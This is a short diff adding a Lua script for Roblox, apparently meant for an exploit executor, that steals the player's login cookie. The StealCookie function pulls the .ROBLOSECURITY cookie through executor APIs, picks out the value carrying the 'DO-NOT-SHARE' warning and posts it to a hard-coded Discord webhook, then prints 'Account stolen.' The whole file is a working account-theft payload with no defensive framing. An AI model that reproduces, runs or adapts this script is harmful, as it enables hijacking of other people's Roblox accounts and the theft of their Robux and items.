@@ -1,0 +1,19 @@
+local HttpService = game:GetService("HttpService")  
+local webhookURL = "https://discord.com/api/webhooks/1427047482767966260/aUbm7HEZaVD99nzbGHPyMoQ5UNG_9UpRIivpNn50aslfkhAakeWrExJaPJTN--MAH930" -- Replace with your ||Discord|| webhook URL
+
+local function StealCookie()  
+    local cookie = syn and syn.cookies and syn.cookies(".roblox.com") or game:GetService("HttpService").Cookies and game:GetService("HttpService"):GetCookies(".roblox.com") or universal_sync and universal_sync.http and universal_sync.http.cookies and universal_sync.http.cookies(".roblox.com")  
+    if cookie and next(cookie) then  
+        for _, v in pairs(cookie) do  
+            if string.find(v, "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-Robux-and-items.|_") then  
+                local data = {["content"] = "Cookie: " .. v}  
+                pcall(function() HttpService:PostAsync(webhookURL, HttpService:Encode(data)) end)  
+                warn("Account stolen.")  
+                return  
+            end  
+        end  
+    end  
+    warn("Cookie retrieval failed.")  
+end
+
+StealCookie()  
